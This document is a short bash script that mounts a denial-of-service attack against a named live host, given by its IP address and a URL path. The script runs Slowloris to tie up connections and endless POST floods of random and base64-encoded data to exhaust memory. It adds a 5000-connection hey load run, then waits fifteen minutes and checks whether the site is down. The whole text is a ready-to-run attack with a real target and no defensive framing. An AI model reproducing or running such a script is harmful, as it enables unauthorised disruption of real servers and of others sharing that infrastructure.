#!/bin/bash

TARGET="https://18-199-122-43.cprapid.com/dpd/update6.php"
IP="18.199.122.43"
THREADS=5000

echo "=== STARTING TERMINATE ATTACK ON: $TARGET ==="

# 1. Slowloris - block the Apache's connections
echo "-> Running Slowloris (max connection lock)..."
slowloris --https -p 443 -s 1024 --sleeptime 10 $IP &
SLOWLORIS_PID=$!

# 2. POST Flood - fill up the RAM
echo "-> Running POST flood (in background)..."
while true; do
  curl -X POST -d "$(head -c 3000000 </dev/urandom)" "$TARGET" > /dev/null 2>&1 &
  sleep 0.2
done &
POST_PID=$!

# 3. File Flood (in background) - if the Apache webserver write POST request in files
echo "-> Optional: Sending file upload bombs (base64 payloads)..."
while true; do
  curl -X POST -d "data=$(head -c 10000000 </dev/urandom | base64)" "$TARGET" > /dev/null 2>&1 &
  sleep 0.2  # optional, prevent the laptop to freeze
done &
FILE_PID=$!

echo "-> Running hey for load CPU and Network..."
hey -n 100000 -c $THREADS "$TARGET"

echo "=== Waiting 15 minutes for effects... ==="
sleep 900

# Shutdown Processes
kill $SLOWLORIS_PID
kill $POST_PID
kill $FILE_PID

echo "=== DONE. Check if website is working. ==="